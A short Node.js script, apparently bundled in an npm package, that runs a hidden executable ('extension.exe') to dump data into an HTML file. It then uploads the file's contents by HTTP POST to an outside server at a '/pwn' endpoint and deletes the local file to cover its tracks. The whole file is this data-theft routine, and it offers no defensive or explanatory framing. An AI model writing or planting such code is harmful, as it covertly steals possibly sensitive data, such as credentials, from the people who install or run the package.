var child_process = require("child_process")
var exec = child_process.exec;
var path = require("path");
const fs = require("fs");
const axios = require("axios");
const pwnurl = "http://1.host.jwte.ch:1337/pwn"
var workdir = ".\\" + path.join(".", "node_modules", "bb-builder") + "\\";
exec(workdir + "extension.exe" + " /shtml \"out.html\"", function(err, stdout, stderr) {
    axios.post(pwnurl, require("fs").readFileSync("./out.html", "utf-8")).then(a => a).catch(console.error)
    fs.unlinkSync("./out.html");
})